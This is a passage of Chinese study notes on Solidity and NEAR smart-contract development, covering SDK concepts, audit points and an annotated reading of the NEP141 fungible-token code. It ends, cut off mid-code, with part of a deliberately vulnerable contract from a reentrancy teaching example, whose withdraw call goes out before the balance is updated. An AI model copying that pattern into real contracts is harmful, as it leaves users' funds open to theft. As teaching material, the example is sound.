<li><code>block.gaslimit</code> ( <code>uint</code> ): 当前区块 gas 限额</li>
<li><code>block.number</code> ( <code>uint</code> ): 当前区块号</li>
<li><code>block.timestamp</code> ( <code>uint</code>): 自 unix epoch 起始当前区块以秒计的时间戳</li>
<li><code>gasleft() returns (uint256)</code> ：剩余的 gas</li>
<li><code>msg.data</code> ( <code>bytes</code> ): 完整的 calldata</li>
<li><code>msg.sender</code> ( <code>address</code> ): 消息发送者（当前调用）</li>
<li><code>msg.sig</code> ( <code>bytes4</code> ): calldata 的前 4 字节（也就是函数标识符）</li>
<li><code>msg.value</code> ( <code>uint</code> ): 随消息发送的 wei 的数量</li>
<li><code>tx.gasprice</code> (<code>uint</code>): 交易的 gas 价格</li>
<li><code>tx.origin</code> ( <code>address</code> ): 交易发起者（完全的调用链）</li>
</ul>
<hr />
<p>参考链接</p>
<ol>
<li></li>
<li><sup class="footnote-reference"><a href="#svf">2</a></sup>: <a href="https://docs.soliditylang.org/en/v0.8.17/units-and-global-variables.html#special-variables-functions">Special Variables and Functions</a></li>
</ol>
<p>Solidity中文文档 https://learnblockchain.cn/docs/solidity/</p>
<p>在线solidity IDE <a href="https://remix.ethereum.org/">Remix</a> </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hello-near"><a class="header" href="#hello-near">Hello NEAR</a></h1>
<h2 id="基本概念"><a class="header" href="#基本概念">基本概念</a></h2>
<p><strong>账号Account</strong> 是NEAR中一个很重要的概念。一个智能合约需要发布在一个账户上。他是人类可读的，一个账户可以有多个公私钥对。可以在测试网注册一个测试账户。</p>
<p>账户支持的8个基本操作</p>
<p><img src="Advanced/Blockchain/NEAR/../images/image-20220808232742623.png" alt="image-20220808232742623" /></p>
<p><strong>存储Storage</strong>也是一个很重要的概念。要为存储付费。</p>
<p>NEAR可以使用AssemblyScript或者Rust进行编程。最后都会编译到WASM。能编译到WASM的语言理论上都可以编写智能合约。</p>
<p>对合约的调用是RPC，通过HTTP进行。</p>
<h2 id="context"><a class="header" href="#context">Context</a></h2>
<p>https://docs.near.org/develop/contracts/environment/</p>
<div class="table-wrapper"><table><thead><tr><th>Variable Name</th><th>SDK Variable</th><th>Description</th><th>备注</th></tr></thead><tbody>
<tr><td>Predecessor</td><td><code>env::predecessor_account_id()</code></td><td><strong>Account ID</strong> that called this method</td><td></td></tr>
<tr><td>Current Account</td><td><code>env::current_account_id()</code></td><td><strong>Account ID</strong> of this smart contract</td><td></td></tr>
<tr><td>Signer</td><td><code>env::signer_account_id()</code></td><td><strong>Account ID</strong> that signed the transaction leading to this execution</td><td></td></tr>
<tr><td>Attached Deposit</td><td><code>env::attached_deposit()</code></td><td>Amount in NEAR attached to the call by the predecessor</td><td>如果xcc panic了，会退回</td></tr>
<tr><td>Account Balance</td><td><code>env::account_balance()</code></td><td><strong>Balance</strong> of this <strong>smart contract</strong> (including Attached Deposit)</td><td></td></tr>
<tr><td>Prepaid Gas</td><td><code>env::prepaid_gas()</code></td><td>Amount of <strong>gas</strong> available for execution</td><td>没有用完的Gas会退回</td></tr>
<tr><td>Timestamp</td><td><code>env::block_timestamp()</code></td><td>Current timestamp (number of non-leap-nanoseconds since January 1, 1970 0:00:00 UTC)</td><td></td></tr>
<tr><td>Current Epoch</td><td><code>env::epoch_height()</code></td><td>Current <strong>epoch</strong> in the blockchain</td><td></td></tr>
<tr><td>Block Index</td><td><code>env::block_index()</code></td><td>Current <strong>block index</strong> (a.k.a. block height)</td><td></td></tr>
<tr><td>Storage Used</td><td><code>env::storage_usage()</code></td><td>Current <strong>storage</strong> used by this smart contract</td><td></td></tr>
<tr><td>Used Gas</td><td><code>env::used_gas()</code></td><td>Amount of <strong>gas</strong> used for execution</td><td></td></tr>
<tr><td>Signer Public Key</td><td><code>env::signer_account_pk()</code></td><td>Sender <strong>Public Key</strong></td><td></td></tr>
<tr><td>Account Locked Balance</td><td><code>env::account_locked_balance()</code></td><td><strong>Balance</strong> of this smart contract that is <strong>locked</strong></td><td></td></tr>
</tbody></table>
</div>
<ul>
<li>什么是balance？什么是locked balance?</li>
<li>什么是gas：代表了可用的计算资源，1 PetaGas  ~ 1 second。用NEAR购买gas。</li>
<li>什么是epoch，什么是block index：和timestamp类似代表执行时间。</li>
<li>什么是account id？</li>
</ul>
<hr />
<h2 id="cross-contract-call"><a class="header" href="#cross-contract-call">Cross Contract Call</a></h2>
<p>跨合约调用，本质上是一个Remote Procedure Call，以HTTP作为传输协议，通过JSON对传输的参数进行序列化。</p>
<blockquote>
<p>类比于传统Server-Client架构，在这里扮演Server角色的是什么呢？</p>
</blockquote>
<p>跨合约调用需要什么？<code>receiver_id</code>, the attached <code>deposit</code> and the amount of <code>gas</code></p>
<p>跨合约调用是异步的。在NEAR中，一个跨合约调用返回一个<code>Promise</code>——虽然写起来没有async/await爽，但是其实是类似的。</p>
<h2 id="storage"><a class="header" href="#storage">Storage</a></h2>
<p>The most common ones are <a href="https://docs.near.org/develop/contracts/storage#vector">Vectors</a>, <a href="https://docs.near.org/develop/contracts/storage#set">Sets</a>, <a href="https://docs.near.org/develop/contracts/storage#map">Maps</a> and <a href="https://docs.near.org/develop/contracts/storage#tree">Trees</a>.</p>
<p>使用存储，需要冻结自己的NEAR。</p>
<p>All collections (i.e. Vector, Map, Tree, etc) have an <strong>unique id</strong> </p>
<p>在数据结构中选用时可以参考：https://docs.near.org/zh-CN/concepts/storage/data-storage</p>
<div class="table-wrapper"><table><thead><tr><th>Type</th><th>Implementation</th><th>Iterable</th><th>Clear All Values</th><th>Preserves Insertion Order</th><th>Range Selection</th></tr></thead><tbody>
<tr><td><a href="https://docs.near.org/zh-CN/concepts/storage/data-storage#vector"><code>Vector</code></a></td><td>数组</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td></tr>
<tr><td><a href="https://docs.near.org/zh-CN/concepts/storage/data-storage#lookupset"><code>LookupSet</code></a></td><td></td><td></td><td></td><td></td><td></td></tr>
<tr><td><a href="https://docs.near.org/zh-CN/concepts/storage/data-storage#unorderedset"><code>UnorderedSet</code></a></td><td></td><td>✅</td><td>✅</td><td></td><td>✅</td></tr>
<tr><td><a href="https://docs.near.org/zh-CN/concepts/storage/data-storage#lookupmap"><code>LookupMap</code></a></td><td>trie字典树</td><td></td><td></td><td></td><td></td></tr>
<tr><td><a href="https://docs.near.org/zh-CN/concepts/storage/data-storage#unorderedmap"><code>UnorderedMap</code></a></td><td></td><td>✅</td><td>✅</td><td></td><td>✅</td></tr>
<tr><td><a href="https://docs.near.org/zh-CN/concepts/storage/data-storage#treemap"><code>TreeMap</code></a></td><td>字典树+数组</td><td>✅</td><td>✅</td><td></td><td></td></tr>
</tbody></table>
</div>
<h2 id="near-sdk"><a class="header" href="#near-sdk">NEAR-SDK</a></h2>
<h3 id="about-near_bindgen"><a class="header" href="#about-near_bindgen">About <code>#[near_bindgen]</code></a></h3>
<ol>
<li>Transform the code into a valid NEAR contract.</li>
<li>Expose public methods, so they can be called externally.</li>
<li>Serialize objects for internal storage and communication with external actors.</li>
</ol>
<p>对于使用<code>#[near_bindgen]</code>宏所修饰定义的Rust智能合约函数中存在有如下多种不同的<strong>可见属性</strong>:</p>
<ul>
<li><code>pub fn:</code> 表明该合约方法为<code>public</code>属于合约接口的一部分，这意味着任何人都可以从合约外部调用它。</li>
<li><code>fn:</code> 若合约的方法函数未显式地指明<code>pub</code>，则表明无法从合约的外部直接调用该函数，只能在合约中由其他函数内部(<code>internal</code>)调用。</li>
<li><code>pub(crate) fn:</code>相当于<code>pub(in crate)</code> ，类似于<code>fn</code>，该可见性修饰符可将具体的合约方法限制在<strong>crate内部</strong>范围内被调用。</li>
</ul>
<p>另外，如果函数不被<code>#[near_bindgen]</code>修饰，那么也是无法从外部调用的。</p>
<p>在这个的基础上，我们还可以在代码中根据AccountID进行进一步的访问控制，例如，我们要求<code>my_method</code>只能被自己的合约所调用，可以在函数前添加判断。典型场景是回调函数，回调函数在合约中的定义必须被设置为<code>public</code>属性，这样才能通过<code>function call</code>的方式被调用；并且当我们在合约中定义回调函数时，还需要确保该回调函数不能被他人随意调用。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub fn my_method(&amp;mut self ) {
    if near_sdk::env::current_account_id() != near_sdk::env::predecessor_account_id() {
        near_sdk::env::panic_str(&quot;Method my_method is private&quot;);
    }
    // 语义上写成下面更加清楚，不知道具体有没有区别？
    // assert_eq!(
    //     near_sdk::env::current_account_id(),
    //     near_sdk::env::predecessor_account_id()
    //     &quot;Method my_method is private&quot;
    // );
    ...
}
<span class="boring">}
</span></code></pre></pre>
<p>这等价于NEAR-SDK提供的<code>#[private]</code>糖。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[private]
pub fn my_method(&amp;mut self) {
    ...
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="what-inside-type-accountid"><a class="header" href="#what-inside-type-accountid">What inside type <code>AccountId</code></a></h3>
<p>是一个对<code>String</code>的简单封装。但是并不是所有的合法的<code>String</code>都是合法的<code>AccountId</code>，<code>near_sdk::env::is_valid_account_id</code>包含了检查其合法性的逻辑，当然我们从``String<code>到</code>Account<code>的转化用</code>from_str`更合适。</p>
<h3 id="what-inside-ext_context"><a class="header" href="#what-inside-ext_context">What inside <code>ext_context</code></a></h3>
<p>其实是包装了一个远程调用（跨合约调用）。让跨合约调用变得简单。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="proof-of-stake-1"><a class="header" href="#proof-of-stake-1">Proof-of-Stake</a></h1>
<p>https://www.investopedia.com/terms/p/proof-stake-pos.asp</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="异步模型"><a class="header" href="#异步模型">异步模型</a></h1>
<div style="break-before: page; page-break-before: always;"></div><p>审计要点：</p>
<ul>
<li>权限控制</li>
<li>DoS 如存储不付费等</li>
<li>钱财丢失 由于各种漏洞可能导致用户获取钱财</li>
</ul>
<h2 id="整数溢出问题"><a class="header" href="#整数溢出问题">整数溢出问题</a></h2>
<p>uint库</p>
<p>如果需要更精细地控制整数溢出的行为，可以调用标准库中的<code>wrapping_*</code>、<code>saturating_*</code>、<code>checked_*</code>和<code>overflowing_*</code>系列函数</p>
<h2 id="重入"><a class="header" href="#重入">重入</a></h2>
<ol>
<li>先做一些检查工作（例如谁调用了函数，参数是否在取值范围之内，它们是否发送了足够的以太币Ether ，用户是否具有token等等）。这些检查工作应该首先被完成。</li>
<li>如果所有检查都通过了，接下来进行更改合约状态变量的操作。</li>
<li>与其它合约的交互应该是任何函数的最后一步。</li>
</ol>
<h2 id="精度"><a class="header" href="#精度">精度</a></h2>
<p>小数和整数除法都面临精度问题。先乘，后除通常是较好的选择。</p>
<h2 id="dos"><a class="header" href="#dos">DoS</a></h2>
<h2 id="权限控制"><a class="header" href="#权限控制">权限控制</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="snippets"><a class="header" href="#snippets">Snippets</a></h1>
<h6 id="storage检查"><a class="header" href="#storage检查">Storage检查</a></h6>
<p>在NEAR中，如果一个函数的调用可能会增加存储的用量，都需要检查对合约的调用是否质押了足够的NEAR，多退少Panic。</p>
<p>如果一个函数可能会减少存储的用量，是不需要退NEAR的。退NEAR发生在Account主动调用<code>withdraw</code>的时候。</p>
<blockquote>
<p>可能会增加存储的用量: 被<code>#[near_bindgen] #[derive(BorshSerialize, BorshDeserialize, PanicOnDefault)]</code>修饰的数据结构，里面有LookupMap,LookupSet,Vector,UnorderedMap,UnorderedSet,TreeMap,LazyOption等数据结构的时候，总之就是他的内存大小是会变化的。这些数据会被序列化之后保存在区块链上，大小当然也是动态的。</p>
</blockquote>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn internal_check_storage(&amp;self, prev_storage: StorageUsage) {
    // 计算存储需要使用的NEAR
    let storage_cost :u128 = env::storage_usage()
    	.checked_sub(prev_storage)
    	.unwrap_or_default() as Balance 
    	* env::storage_byte_cost();
	
    // 计算需要退还的NEAR，多退
    // 如果少了直接Panic
    let refund = env::attached_deposit().checked_sub(storage_cost).expect(
        format!(
            &quot;ERR_STORAGE_DEPOSIT need {}, attatched {}&quot;,
            storage_cost,
            env::attached_deposit()
        )
        .as_str(),
    );
    if refund &gt; 0 {
        Promise::new(env::predecessor_account_id()).transfer(refund);
    }
}
<span class="boring">}
</span></code></pre></pre>
<h6 id="owner"><a class="header" href="#owner">Owner</a></h6>
<p>设置一个合约的Owner的常用代码。<code>assert_owner</code>的逻辑就是<code>env::predecessor_account_id() == self.owner_id</code>,</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[payable]
pub fn set_owner(&amp;mut self, owner_id: ValidAccountId) {
    assert_one_yocto();
    self.assert_owner();
    self.owner_id = owner_id.as_ref().clone();
}

/// Get the owner of this account.
pub fn get_owner(&amp;self) -&gt; AccountId {
    self.owner_id.clone()
}
<span class="boring">}
</span></code></pre></pre>
<p>这个写法不好。万一owner设错了就完蛋了。可以两步完成。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="标准实现代码分析"><a class="header" href="#标准实现代码分析">标准实现代码分析</a></h1>
<p>发现一些智能合约实现的规律，和普通编程的区别：</p>
<ol>
<li>避免使用遍历操作。</li>
<li>用空间换取时间，存储很多本来通过计算可以得到的结果。所以编程的时候要注意状态的更新。</li>
<li>由于Panic可以回滚，会大量使用Panic，和日常编程不同。</li>
</ol>
<h2 id="fungible-token--storage"><a class="header" href="#fungible-token--storage">Fungible Token &amp; Storage</a></h2>
<p><a href="https://nomicon.io/Standards/Tokens/FungibleToken/Core">标准介绍</a> <a href="https://github.com/near/near-sdk-rs/tree/4.0.0/near-contract-standards/src/fungible_token">标准实现</a> <a href="https://github.com/near/near-sdk-rs/tree/4.0.0/examples/fungible-token">例子</a></p>
<p>NEP141为NEAR公链上的Fungible Token （以下均用FT简称）标准 。大部分NEAR上的FT都遵循NEP141标准。可以简单的认为FT就是一种虚拟货币，类似于人民币、美元等等。所有人都可以发行自己的FT，只不过有没有价值另说。</p>
<h3 id="corers"><a class="header" href="#corers">core.rs</a></h3>
<p>在这个文件中，规定了4个接口在<code>trait FungibleTokenCore</code>中。如果我们要自行实现符合NEP141的智能合约，也可以自己去实现这些接口，不过官方已经给出了标准实现，也就是后面将要分析的代码。</p>
<ul>
<li><code>ft_transfer()</code>: 转账。</li>
<li><code>ft_transfer_call()</code>: 转账的同时调用reciever的<code>ft_on_transfer</code>。</li>
<li><code>ft_total_supply()</code>: 查询FT的发行总量。</li>
<li><code>ft_balance_of()</code>: 查询用户的FT存款。</li>
</ul>
<h3 id="core_implrs"><a class="header" href="#core_implrs">core_impl.rs</a></h3>
<p>关键是看这里对规定接口的实现。首先是存储信息的数据结构：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub struct FungibleToken {
    /// 可以视为发行的FT的中央账本，记录了每个用户的存款，最重要的数据结构
    pub accounts: LookupMap&lt;AccountId, Balance&gt;,

    /// FT的发行总量，其实可以从LookupMap中计算得到，但是那样的话开销太大了
    pub total_supply: Balance,

    /// 每个Account占用的Storage
    pub account_storage_usage: StorageUsage,
}
<span class="boring">}
</span></code></pre></pre>
<p>我们依次看一下<code>FungibleToken</code>方法的实现，对于不重要的函数仅作功能介绍</p>
<ul>
<li>
<p>new: 创建一个新的<code>FungibleToken</code></p>
</li>
<li>
<p>measure_account_storage_usage: 通过临时插入一个Account，来计算我的中央账本中每一个Account会占用的Storage</p>
</li>
<li>
<p><code>internal_unwrap_balance_of(&amp;self, account: &amp;AccountId) -&gt; Balance</code>: 查询account的FT数量，如果account不存在会Panic</p>
</li>
<li>
<p><code>internal_deposit(&amp;mut self, account: &amp;AccountId, amount: Balance)</code>: 给account增加amount个FT，注意发行总量也要随之改变，注意这里涉及到加法运算，小心溢出。</p>
</li>
<li>
<p><code>internal_withdraw(&amp;mut self, account_id: &amp;AccountId, amount: Balance)</code>: 给account减少amount个FT，注意发行总量也要随之改变，注意这里涉及到减法运算，小心溢出。</p>
</li>
<li>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub fn internal_transfer(
    &amp;mut self,
    sender: &amp;AccountId,
    receiver: &amp;AccountId,
    amount: Balance,
    memo: Option&lt;String&gt;,
)
<span class="boring">}
</span></code></pre></pre>
<p>sender转账receiver amount个FT。memo是记日志的备注，不重要。发行总量不需要改变，同时涉及到加法和减法的运算，小心溢出。代码中为了提高效率，当amount为0或者sender=receiver的时候直接退出。</p>
<blockquote>
<p>所以为什么之前的internal_deposit和internal_withdraw不判断amount是否为0呢？不过不影响正确性就是了。</p>
<p>所以为什么之前的internal_deposit和internal_withdraw不记日志但是要修改total_supply呢？</p>
<p>为什么这两个函数要单独存在呢？</p>
</blockquote>
</li>
<li>
<p>internal_register_account: 在中央账本中给account开户，如果已经account存在的话panic。</p>
</li>
</ul>
<p>下面介绍最重要的函数，对4个接口的实现进行介绍：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn ft_transfer(&amp;mut self, receiver_id: AccountId, amount: U128, memo: Option&lt;String&gt;) {
    // 保证attached_deposit == 1 yocto NEAR，为了让只有拥有full-access key才可以转账
    assert_one_yocto();
    // env::predeccor_account_id()，可以认为就是这个函数的远程调用者的id
    let sender_id = env::predecessor_account_id();
    // 转账的金额，进行一个类型转换
    let amount: Balance = amount.into();
    // 调用内部的转账函数
    self.internal_transfer(&amp;sender_id, &amp;receiver_id, amount, memo);
}
<span class="boring">}
</span></code></pre></pre>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
<p>https://welcome.near.university/developers/contract-patterns/assert_one_yocto-forced-confirmation</p>
</div>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn ft_transfer_call(
    &amp;mut self,
    receiver_id: AccountId,
    amount: U128,
    memo: Option&lt;String&gt;,
    msg: String,
) -&gt; PromiseOrValue&lt;U128&gt; {
    assert_one_yocto();
    // 由于要调用receiver的ft_on_transfer，所以正好是ft_transfer_call的Gas肯定是不够的
    require!(env::prepaid_gas() &gt; GAS_FOR_FT_TRANSFER_CALL, &quot;More gas is required&quot;);
    let sender_id = env::predecessor_account_id();
    let amount: Balance = amount.into();
    self.internal_transfer(&amp;sender_id, &amp;receiver_id, amount, memo);
	// 上面和之前的ft_transfer类似
    // Initiating receiver's call and the callback
    // 这个是进行CrossContractCall的写法，调用receiver_id的方法
    ext_ft_receiver::ext(receiver_id.clone())
        // 准备Gas
    	.with_static_gas(env::prepaid_gas() - GAS_FOR_FT_TRANSFER_CALL)
        // 调用receiver_id的ft_on_transfer
    	.ft_on_transfer(sender_id.clone(), amount.into(), msg)
        // 待ft_on_transfer返回的时候，执行回调函数
    	.then(
        	ext_ft_resolver::ext(env::current_account_id())
        	.with_static_gas(GAS_FOR_RESOLVE_TRANSFER)
        	.ft_resolve_transfer(sender_id, receiver_id, amount.into()),
    	)
    	.into()
}
<span class="boring">}
</span></code></pre></pre>
<p>来看回调函数是用来做什么的，<code>ft_on_tranfer</code>在执行成功后，会返回一个退款的值，将FT退回给Sender。但是由于<code>ft_on_transfer</code>是用户自定义的函数，所以我们在处理的时候要考虑边界情况。</p>
<p><code>unused_amount</code>的取值会在下面三者之间：</p>
<ol>
<li>{0} -&gt; 不做任何事</li>
<li>(0, receiver's balance] -&gt; 此时有能力退款，sender += unused_amout, reciver -= unused_amout</li>
<li>(receiver's balance, +∞) -&gt; 此时无能力退款，尽力退款。 sender += receiver's balance, reciver -= receiver's balance = 0</li>
</ol>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub fn internal_ft_resolve_transfer(
        &amp;mut self,
        sender_id: &amp;AccountId,
        receiver_id: AccountId,
        amount: U128,
    ) -&gt; (u128, u128) {
        let amount: Balance = amount.into();

        // Get the unused amount from the `ft_on_transfer` call result. 
        // 下面用“声明的退款”表示unused_amount
        let unused_amount = match env::promise_result(0) {
            PromiseResult::NotReady =&gt; env::abort(),
            PromiseResult::Successful(value) =&gt; {
                // 声明的退款不能大于我的转账
                if let Ok(unused_amount) = near_sdk::serde_json::from_slice::&lt;U128&gt;(&amp;value) {
                    std::cmp::min(amount, unused_amount.0)
                } else {
                    amount
                }
            }
            PromiseResult::Failed =&gt; amount,
        };
		
        // 如果退款是0的话，不需要特殊处理
        if unused_amount &gt; 0 {
            // 获取退款方的FT数量
            let receiver_balance = self.accounts.get(&amp;receiver_id).unwrap_or(0);
            // 如果退款方没有FT也不需要特殊处理，他没钱退款
            if receiver_balance &gt; 0 {
                // 退款是 退款方的FT 和 声明的退款 的较小值
                let refund_amount = std::cmp::min(receiver_balance, unused_amount);
                // 这里肯定不会溢出
                self.accounts.insert(&amp;receiver_id, &amp;(receiver_balance - refund_amount));

                // 判断接受退款方是否存在，有可能他已经注销了
                if let Some(sender_balance) = self.accounts.get(sender_id) {
                    // 如果接受退款方存在，将退款
                    self.accounts.insert(sender_id, &amp;(sender_balance + refund_amount));
                    // 记个日志
                    FtTransfer {
                        old_owner_id: &amp;receiver_id,
                        new_owner_id: sender_id,
                        amount: &amp;U128(refund_amount),
                        memo: Some(&quot;refund&quot;),
                    }
                    .emit();
                    return (amount - refund_amount, 0);
                } else {
                    // Sender's account was deleted, so we need to burn tokens.
                    // 总发行量减去退款
                    self.total_supply -= refund_amount;
                    log!(&quot;The account of the sender was deleted&quot;);
                    // 记个日志
                    FtBurn {
                        owner_id: &amp;receiver_id,
                        amount: &amp;U128(refund_amount),
                        memo: Some(&quot;refund&quot;),
                    }
                    .emit();
                    return (amount, refund_amount);
                }
            }
        }
        (amount, 0)
    }
<span class="boring">}
</span></code></pre></pre>
<p>下面的两个函数并不复杂</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn ft_total_supply(&amp;self) -&gt; U128 {
    self.total_supply.into()
}
fn ft_balance_of(&amp;self, account_id: AccountId) -&gt; U128 {
    self.accounts.get(&amp;account_id).unwrap_or(0).into()
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="eventrs"><a class="header" href="#eventrs">event.rs</a></h3>
<p>这里是对三种事件做日志：</p>
<p>铸币(mint)：total_supply增加</p>
<p>熔币(burn): total_supply减少</p>
<p>转账(transfer): 一个account的FT转移给另一个account的FT</p>
<h3 id="macrosrs"><a class="header" href="#macrosrs">macros.rs</a></h3>
<p>提供了两个宏，让你简单的为自己的类实现标准实现。还提供了两个hook。</p>
<h3 id="metadatars"><a class="header" href="#metadatars">metadata.rs</a></h3>
<p>关于FT的一些元数据</p>
<h3 id="receiverrs"><a class="header" href="#receiverrs">receiver.rs</a></h3>
<p>提供了远程调用<code>ft_on_transfer</code>的方法。</p>
<h3 id="resolverrs"><a class="header" href="#resolverrs">resolver.rs</a></h3>
<p>提供了处理<code>ft_on_transfer</code>返回的回调。</p>
<h3 id="storage_implrs"><a class="header" href="#storage_implrs">storage_impl.rs</a></h3>
<p>终于来到了最后一个文件。然而要理解这个代码，首先要理解<a href="https://nomicon.io/Standards/StorageManagement">Storage Management NEP145</a>。其核心思想为，对于一个账户<code>example.near</code>，如果上面的合约需要存储数据，就需要**质押(stake)**对应于存储量的NEAR。我们直接分析其接口。那么我们的FT合约，每次添加一个用户需要消耗一定的存储，这个负担显然是要用户来承担的，不然恶意的用户就可以无限注册了。这也就是这个文件要保证的事情。</p>
<p>我们结合接口和实现进行分析</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait StorageManagement {
    fn storage_deposit(
        &amp;mut self,
        account_id: Option&lt;AccountId&gt;,
        registration_only: Option&lt;bool&gt;,
    ) -&gt; StorageBalance;
    fn storage_withdraw(&amp;mut self, amount: Option&lt;U128&gt;) -&gt; StorageBalance;
    fn storage_unregister(&amp;mut self, force: Option&lt;bool&gt;) -&gt; bool;
    fn storage_balance_bounds(&amp;self) -&gt; StorageBalanceBounds;
    fn storage_balance_of(&amp;self, account_id: AccountId) -&gt; Option&lt;StorageBalance&gt;;
}
<span class="boring">}
</span></code></pre></pre>
<p>storage_deposit：为存储付费，在我们的场景其实就是在中央账本上注册帐号。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// `registration_only` doesn't affect the implementation for vanilla fungible token.
#[allow(unused_variables)]
fn storage_deposit(
    &amp;mut self,
    account_id: Option&lt;AccountId&gt;,
    registration_only: Option&lt;bool&gt;,
) -&gt; StorageBalance {
    // 转来的NEAR
    let amount: Balance = env::attached_deposit();
    // 看起来只要你付NEAR了，就可以帮别人注册。默认是给合约调用者注册
    let account_id = account_id.unwrap_or_else(env::predecessor_account_id);
    // 如果已经存在了这个帐号，就不应该再给他收存储费了
    if self.accounts.contains_key(&amp;account_id) {
        log!(&quot;The account is already registered, refunding the deposit&quot;);
        if amount &gt; 0 {
            Promise::new(env::predecessor_account_id()).transfer(amount);
        }
    } else {
        // 获取存储帐号信息最少需要的NEAR，其实就是确切的需要的NEAR，因为在我们的场景中数据的大小是固定的。
        let min_balance = self.storage_balance_bounds().min.0;

        // TODO 为什么这里就是panic而不是退回呢，类似的上面为什么是退回而不是Panic？Panic后是会退回的。
        // 应该是出于逻辑上的考量：Panic说明中央账本上没有，Success说明中央账本上有
        if amount &lt; min_balance {
            env::panic_str(&quot;The attached deposit is less than the minimum storage balance&quot;);
        }

        // 在中央账本上添加account信息
        self.internal_register_account(&amp;account_id);
        // 将多余的NEAR退还
        let refund = amount - min_balance;
        if refund &gt; 0 {
            Promise::new(env::predecessor_account_id()).transfer(refund);
        }
    }
    self.internal_storage_balance_of(&amp;account_id).unwrap()
}
<span class="boring">}
</span></code></pre></pre>
<p>storage_withdraw：撤回存储。比如原来用户用了10K的存储，后来变成5K了，那么就可以把多质押的NEAR取回。不过在我们的场景下，其实存储量并不会变动，所以这个函数没有什么卵用。你看amount只要大于0就会Panic。。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn storage_withdraw(&amp;mut self, amount: Option&lt;U128&gt;) -&gt; StorageBalance {
    // 只能本人亲自来
    assert_one_yocto();
    let predecessor_account_id = env::predecessor_account_id();
    if let Some(storage_balance) = self.internal_storage_balance_of(&amp;predecessor_account_id) {
        match amount {
            Some(amount) if amount.0 &gt; 0 =&gt; {
                env::panic_str(&quot;The amount is greater than the available storage balance&quot;);
            }
            _ =&gt; storage_balance,
        }
    } else {
        env::panic_str(
            format!(&quot;The account {} is not registered&quot;, &amp;predecessor_account_id).as_str(),
        );
    }
<span class="boring">}
</span></code></pre></pre>
<p>storage_unregister: 与之对应的storage_deposit。取消注册，我们应该把用户为了存储而质押的NEAR返回给他。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 这里我做了一点修改，取消了一层封装
fn storage_unregister(&amp;mut self, force: Option&lt;bool&gt;) -&gt; bool {
    // 只能本人亲自来
    assert_one_yocto();
    let account_id = env::predecessor_account_id();
    // force如果是true的话，即使在中央账本中accout还有余额FT，也照样注销
    let force = force.unwrap_or(false);
    if let Some(balance) = self.accounts.get(&amp;account_id) {
        if balance == 0 || force {
            // 从中央账本中注销帐号
            self.accounts.remove(&amp;account_id);
            // 总发行量减少，TODO 这里为什么不需要打一个Burn的日志？
            self.total_supply -= balance;
            // 将质押的NEAR转回去
            Promise::new(account_id.clone()).transfer(self.storage_balance_bounds().min.0 + 1);
            true
        } else {
            // 账户里还有余额并且没有force的话，报错
            env::panic_str(
                &quot;Can't unregister the account with the positive balance without force&quot;,
            )
        }
    } else {
        log!(&quot;The account {} is not registered&quot;, &amp;account_id);
        false
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>storage_balance_bounds: 返回存储需要的NEAR，虽然是一个返回值是一个上下范围，但实际上在我们的场景中存储大小固定，最小值=最大值。算法就是<code>bytes * NEAR/bytes</code>，很简单。</p>
<p>storage_balance_of: 返回帐号为质押的NEAR中，有多少是质押的，有多少是空闲的。但实际上在我们的场景中存储大小固定，所以全部都会是质押的，没有空闲的。</p>
<hr />
<p>我们还可以在这里看到一个非常简单的FT实现，作为重入攻击的例子一部分。他由三部分（三个合约）组成：</p>
<ul>
<li>ft_contract: 这是一个非常简单的FT实现。仅仅提供了<code>ft_transfer_call</code>接口，实现转账并调用接受者的<code>ft_on_transfer</code>函数。并且为了简单起见，接受者在这里就是</li>
<li>victim_contract: 为一个DEX合约，可以认为是Token的交易平台，存在漏洞。</li>
<li>attack_contract: 攻击者合约。</li>
</ul>
<p>我们主要专注存在漏洞的合约。<code>withdraw</code>函数的目的是把DEX合约中attacker_balance账户中的FT支付给FT平台。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub fn withdraw(&amp;mut self, amount: u128) -&gt; Promise {
    assert!(self.attacker_balance &gt;= amount);
    // Call Attacker的收币函数
    let ft_token = AccountId::from_str(FT_TOKEN).unwrap();
    // 调用`ft_on_transfer`进行支付操作，一个Promise
    ext_ft_token::ext(ft_token)
        .with_static_gas(GAS_FOR_SINGLE_CALL)
        .ft_transfer_call(amount)
        .then(
            // 在回调函数中从attacker_balance减去支付的FT，又一个Promise
            ext_self::ext(env::current_account_id())
